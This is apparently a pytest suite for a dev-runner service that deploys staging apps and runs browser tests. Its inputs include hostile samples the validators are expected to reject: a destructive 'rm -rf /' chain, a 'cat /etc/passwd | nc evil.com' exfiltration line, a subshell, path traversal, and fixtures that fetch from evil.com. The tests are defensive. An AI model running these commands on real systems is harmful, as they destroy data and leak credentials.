"""
Unit tests for dev-runner browser integration helpers.

Run with: python -m pytest test_main.py -v
"""

from __future__ import annotations

import asyncio
import os
import re
import sys
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient

# Ensure the module can be imported
sys.path.insert(0, os.path.dirname(__file__))

import main


# ── _remote_url / _local_url ────────────────────────────────────────────────

class FakeManagedApp:
    def __init__(self, port=8100):
        self.port = port
        self.app_id = "test-app"
        self.status = "running"
        self.started_at = 0.0

    def is_alive(self):
        return True


def test_remote_url():
    app = FakeManagedApp(port=8105)
    assert main._remote_url(app) == "http://dev-runner:8105"


def test_local_url():
    app = FakeManagedApp(port=8105)
    assert main._local_url(app) == "http://localhost:8105"


def test_urls_differ():
    """Lightpanda (remote) and Chromium (local) must use different base URLs."""
    app = FakeManagedApp(port=8100)
    assert main._remote_url(app) != main._local_url(app)


# ── _sanitize_browser_error ─────────────────────────────────────────────────

def test_sanitize_strips_dev_runner_host():
    err = Exception("page.goto: net::ERR_CONNECTION_REFUSED at http://dev-runner:8105/path")
    result = main._sanitize_browser_error(err)
    assert "dev-runner" not in result
    assert "<staging-app>" in result


def test_sanitize_strips_localhost():
    err = Exception("Navigation to http://localhost:8100 failed")
    result = main._sanitize_browser_error(err)
    assert "localhost" not in result
    assert "<staging-app>" in result


def test_sanitize_strips_127():
    err = Exception("Timeout at http://127.0.0.1:8100/foo")
    result = main._sanitize_browser_error(err)
    assert "127.0.0.1" not in result


def test_sanitize_strips_cdp_url():
    err = Exception("Failed to connect to ws://lightpanda:9222")
    result = main._sanitize_browser_error(err)
    assert "lightpanda" not in result
    assert "<cdp-endpoint>" in result


def test_sanitize_preserves_non_url_content():
    err = Exception("Element not found: #my-button")
    result = main._sanitize_browser_error(err)
    assert result == "Element not found: #my-button"


# ── _validate_selector ──────────────────────────────────────────────────────

def test_validate_selector_accepts_valid_css():
    # Should not raise
    main._validate_selector("div.container > h1", "click")
    main._validate_selector("#my-id", "click")
    main._validate_selector("[data-testid='submit']", "click")
    main._validate_selector("input[type=\"email\"]", "fill")
    main._validate_selector("body", "assert_text")


def test_validate_selector_rejects_none():
    with pytest.raises(HTTPException) as exc_info:
        main._validate_selector(None, "click")
    assert exc_info.value.status_code == 400
    assert "required" in exc_info.value.detail.lower()


def test_validate_selector_rejects_too_long():
    with pytest.raises(HTTPException) as exc_info:
        main._validate_selector("a" * 501, "click")
    assert exc_info.value.status_code == 400
    assert "too long" in exc_info.value.detail.lower()


def test_validate_selector_rejects_suspicious_chars():
    """Prevent JS injection via selector string."""
    with pytest.raises(HTTPException) as exc_info:
        main._validate_selector("div; document.cookie", "click")
    assert exc_info.value.status_code == 400


def test_validate_selector_rejects_backticks():
    with pytest.raises(HTTPException) as exc_info:
        main._validate_selector("`injected`", "click")
    assert exc_info.value.status_code == 400


def test_validate_selector_rejects_braces():
    with pytest.raises(HTTPException) as exc_info:
        main._validate_selector("div { color: red }", "click")
    assert exc_info.value.status_code == 400


# ── _sanitize_command ───────────────────────────────────────────────────────

def test_sanitize_command_replaces_port():
    result = main._sanitize_command("uvicorn main:app --port {port}", 8100)
    assert result == "uvicorn main:app --port 8100"


def test_sanitize_command_blocks_semicolon():
    with pytest.raises(HTTPException) as exc_info:
        main._sanitize_command("echo hello; rm -rf /", 8100)
    assert exc_info.value.status_code == 400


def test_sanitize_command_blocks_pipe():
    with pytest.raises(HTTPException) as exc_info:
        main._sanitize_command("cat /etc/passwd | nc evil.com 9999", 8100)
    assert exc_info.value.status_code == 400


def test_sanitize_command_blocks_subshell():
    with pytest.raises(HTTPException) as exc_info:
        main._sanitize_command("echo $(whoami)", 8100)
    assert exc_info.value.status_code == 400


# ── _validate_app_dir ───────────────────────────────────────────────────────

def test_validate_app_dir_blocks_traversal(tmp_path):
    with patch.object(main, "WORKSPACE_PATH", str(tmp_path)):
        with pytest.raises(HTTPException) as exc_info:
            main._validate_app_dir("../../etc")
        assert exc_info.value.status_code == 400
        assert "path traversal" in exc_info.value.detail.lower()


def test_validate_app_dir_blocks_missing(tmp_path):
    with patch.object(main, "WORKSPACE_PATH", str(tmp_path)):
        with pytest.raises(HTTPException) as exc_info:
            main._validate_app_dir("nonexistent-app")
        assert exc_info.value.status_code == 400
        assert "not found" in exc_info.value.detail.lower()


def test_validate_app_dir_accepts_valid(tmp_path):
    app_dir = tmp_path / "my-app"
    app_dir.mkdir()
    with patch.object(main, "WORKSPACE_PATH", str(tmp_path)):
        result = main._validate_app_dir("my-app")
    assert result == app_dir


# ── _scan_for_suspicious_patterns ───────────────────────────────────────────

def test_scan_detects_fetch(tmp_path):
    (tmp_path / "app.js").write_text("fetch('https://evil.com/steal')")
    findings = main._scan_for_suspicious_patterns(tmp_path)
    assert len(findings) >= 1
    assert findings[0]["pattern"] == "outbound fetch"


def test_scan_detects_external_script(tmp_path):
    (tmp_path / "index.html").write_text('<script src="https://evil.com/inject.js"></script>')
    findings = main._scan_for_suspicious_patterns(tmp_path)
    assert len(findings) >= 1
    assert findings[0]["pattern"] == "external script"


def test_scan_skips_node_modules(tmp_path):
    nm = tmp_path / "node_modules" / "lib"
    nm.mkdir(parents=True)
    (nm / "index.js").write_text("fetch('https://npmjs.org')")
    findings = main._scan_for_suspicious_patterns(tmp_path)
    assert len(findings) == 0


def test_scan_clean_app(tmp_path):
    (tmp_path / "index.html").write_text("<h1>Hello World</h1>")
    (tmp_path / "app.js").write_text("console.log('clean')")
    findings = main._scan_for_suspicious_patterns(tmp_path)
    assert len(findings) == 0


# ── deploy env vars ─────────────────────────────────────────────────────────

def test_deploy_sets_host_env_vars():
    """Verify the env dict in deploy includes all framework bind-address vars."""
    # We test this indirectly by checking the source code contains the expected keys.
    # A real integration test would check the actual env passed to Popen.
    import inspect
    source = inspect.getsource(main.deploy)
    for var in ["HOST", "BIND_ADDR", "HOSTNAME", "LISTEN_ADDR"]:
        assert f'"{var}"' in source, f"Missing {var} in deploy env"


# ── Health endpoint ─────────────────────────────────────────────────────────

def test_health_endpoint():
    client = TestClient(main.app)
    resp = client.get("/health")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "ok"
    assert "available_ports" in data
    assert "running_apps" in data


# ── Browser test selector validation ────────────────────────────────────────

def test_browser_test_validates_selectors_upfront():
    """Selectors are validated before connecting to browser."""
    client = TestClient(main.app)

    # First deploy a fake app so we get past the 404 check
    # Actually we can't easily without a real process, so test the HTTP layer
    resp = client.post("/browser-test/nonexistent-app", json={
        "steps": [{"action": "click", "selector": None}],
    })
    # Should fail on app not found (404), not selector validation,
    # because app lookup happens first
    assert resp.status_code == 404

    # Test with an invalid selector but valid app_id format
    # The selector validation happens after app lookup
    # So we just test the _validate_selector function directly above


# ── CDP retry helper ────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_cdp_retry_succeeds_after_failures():
    """CDP connect retries on transient failures."""
    pw = MagicMock()
    call_count = 0

    async def mock_connect(*args, **kwargs):
        nonlocal call_count
        call_count += 1
        if call_count < 3:
            raise ConnectionError("CDP connection refused")
        return MagicMock()

    pw.chromium.connect_over_cdp = mock_connect

    browser = await main._connect_cdp_with_retry(pw)
    assert call_count == 3
    assert browser is not None


@pytest.mark.asyncio
async def test_cdp_retry_raises_after_exhaustion():
    """CDP connect raises after all retries exhausted."""
    pw = MagicMock()

    async def mock_connect(*args, **kwargs):
        raise ConnectionError("CDP connection refused")

    pw.chromium.connect_over_cdp = mock_connect

    with pytest.raises(ConnectionError):
        await main._connect_cdp_with_retry(pw)


# ── Port allocation ─────────────────────────────────────────────────────────

def test_port_allocation_and_release():
    """Ports are properly allocated and returned to the pool."""
    original_available = main._available_ports.copy()
    original_allocated = main._allocated_ports.copy()

    try:
        port = main._allocate_port("test-alloc")
        assert port not in main._available_ports
        assert main._allocated_ports["test-alloc"] == port

        main._release_port("test-alloc")
        assert port in main._available_ports
        assert "test-alloc" not in main._allocated_ports
    finally:
        # Restore state
        main._available_ports.clear()
        main._available_ports.update(original_available)
        main._allocated_ports.clear()
        main._allocated_ports.update(original_allocated)


def test_port_exhaustion():
    """Should raise 503 when all ports are allocated."""
    original_available = main._available_ports.copy()
    try:
        main._available_ports.clear()
        with pytest.raises(HTTPException) as exc_info:
            main._allocate_port("exhaustion-test")
        assert exc_info.value.status_code == 503
    finally:
        main._available_ports.clear()
        main._available_ports.update(original_available)
